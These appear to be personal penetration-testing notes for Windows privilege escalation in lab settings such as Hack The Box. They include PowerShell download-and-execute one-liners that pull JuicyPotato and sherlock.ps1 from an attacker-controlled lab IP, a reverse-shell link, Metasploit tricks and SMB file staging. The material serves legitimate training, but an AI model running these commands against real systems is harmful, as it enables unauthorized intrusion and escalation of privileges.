
# Windows Shell Commands
- if you're like me, you mostly use windows for development so you may need help when cmds like "whoami" don't work
- great guides with more in depth knowledge
- help escalating: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
- powershell "IEX(New-Object Net.WebClient).downloadFile('http://10.10.14.25:5555/JuicyPotato.exe', 'C:\Users\merlin\JuicyPotato.exe')" -bypass executionpolicy
- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
- IEX(New-Object Net.Webclient).downloadString('http://10.10.16.3:5555/sherlock.ps1')

## Simple tricks
  - use the below if commands aren't working.  Basically, the process you're currently running has certain restrictions and you want to switch to a more stable one
  - ps
    - migrate [pid]
  - use the metasploit exploit suggester
    - search local_exploit_suggester
  - weird changing of permissions: https://ranakhalil101.medium.com/hack-the-box-chatterbox-writeup-w-o-metasploit-c8421ac09318
  - systeminfo
  - whoami /priv
    - SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
      - then juicy potato exploit: https://github.com/ohpe/juicy-potato/releases

Compiling windows .c files on kali  
    - i686-w64-mingw32-gcc exploit.c -o exploit -lws2_32
    - apt-get install gcc-mingw-w64-i686

## upload stuff to windows
  - sudo impacket-smbserver kali .
  - copy \\10.10.16.3\kali\JuicyPotato.exe

## binaries
  - you can always upload binaries to execute commands you need, but the machine doesn't have
  - list of binaries below:
    - /usr/share/windows-binaries/whoami.exe

## Searching for things
- this includes searching for programs and files (maybe ones you uploaded)

  ### Finding folders
    - dir /s *your file name*

## Windows XP Specific
  - To figure out if you're admin
    - reg query "HKU\S-1-5-19"
